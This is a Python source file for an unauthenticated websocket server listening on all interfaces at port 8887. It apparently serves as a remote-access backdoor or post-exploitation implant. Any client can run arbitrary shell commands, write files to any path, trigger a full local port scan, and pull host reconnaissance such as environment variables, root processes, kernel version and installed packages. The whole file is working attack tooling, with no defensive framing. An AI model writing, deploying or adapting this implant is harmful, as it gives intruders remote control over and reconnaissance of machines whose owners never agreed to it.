"""
@author='九世 '
@time='2018/12/25'
"""

import websockets
import asyncio
import os
import json
import time
import socket
import threading

openport=[]
keyq=[]
jw={}
shells={}
tk=[]
lxc={'os_version':'cat /etc/lsb-release','kernel_version':'uname -a','environmental_variables':'set','printer':' lpstat -a','operating_services':'ps -a','processes_with_root_privileges':'ps -ef | grep root','installed_version_and_running_status':'dpkg -l'}
keys=[]



def portscan(ip,port):
    s=socket.socket()
    try:
        s.connect((ip,port))
        openport.append('[+] {}:{}'.format(ip,port))
    except:
        pass


async def server(websocket,path):
    nm = {}
    id = 0
    while True:
        recvs=await websocket.recv()
        if recvs=="shell":
            while True:
                duqu=await websocket.recv()
                value=json.loads(duqu)
                if value['cmd']=="back":
                    break
                elif value['cmd']!="back":
                    zx=os.popen(value['cmd'])
                    shells['jg']=zx.read()
                    jg=json.dumps(shells)
                    await websocket.send(jg)

        elif recvs=="upload":
            js=await websocket.recv()
            qjs=json.loads(js)
            zhi=qjs['value']
            target_path=qjs['target_path']
            xjs=open(target_path,'wb')
            xjs.write(bytes(zhi,encoding='utf-8'))
            xjs.close()
            if os.path.exists(target_path):
                await websocket.send('[+] {} ok'.format(target_path))
            else:
                await websocket.send('[+] {} ok'.format(target_path))

        elif recvs=="portscan":
            for i in range(1, 65535):
                t = threading.Thread(target=portscan, args=('127.0.0.1', i))
                t.start()

            openport2=[]
            openports = {}
            for q in openport:
                openport2.append(q)


            lens=len(openport2)
            print(lens)
            for q in openport2:
                print(q)
                id+=1
                openports['openport']=q
                openports['ids']=id
                openports['jgs']=lens
                zhuanhuan=json.dumps(openports)
                await websocket.send(zhuanhuan)

            del openport[0:]
            del openport2[0:]
            openports.clear()



        elif recvs=="Lcollection":
            os_version=os.popen(lxc.get('os_version'))
            nm['os_version']=os_version.read()
            os_versions=json.dumps(nm)
            await websocket.send(os_versions)
            del nm
            nm={}
            kernel_version=os.popen(lxc.get('kernel_version'))
            nm['kernel_version']=kernel_version.read()
            kernel_versions=json.dumps(nm)
            await websocket.send(kernel_versions)
            del nm
            nm={}
            environmental_variable=os.popen(lxc.get('environmental_variables'))
            nm['environmental_variable']=environmental_variable.read()
            environmental_variables=json.dumps(nm)
            await websocket.send(environmental_variables)
            del nm
            nm={}
            printer=os.popen(lxc.get('printer'))
            nm['printer']=printer.read()
            printers=json.dumps(nm)
            await websocket.send(printers)
            del nm
            nm={}
            operating_services=os.popen(lxc.get('operating_services'))
            nm['operating_services']=operating_services.read()
            operating_service=json.dumps(nm)
            await websocket.send(operating_service)
            del nm
            nm={}
            processes_with_root_privileges=os.popen(lxc.get('processes_with_root_privileges'))
            nm['processes_with_root_privileges']=processes_with_root_privileges.read()
            processes_with_root_privilege=json.dumps(nm)
            await websocket.send(processes_with_root_privilege)
            del nm
            nm={}
            installed_version_and_running_status=os.popen(lxc.get('installed_version_and_running_status'))
            nm['installed_version_and_running_status']=installed_version_and_running_status.read()
            installed_version_and_running_statu=json.dumps(nm)
            await websocket.send(installed_version_and_running_statu)

if __name__ == '__main__':
    websock=websockets.serve(server,'0.0.0.0',8887)
    loop=asyncio.get_event_loop()
    loop.run_until_complete(websock)
    loop.run_forever()
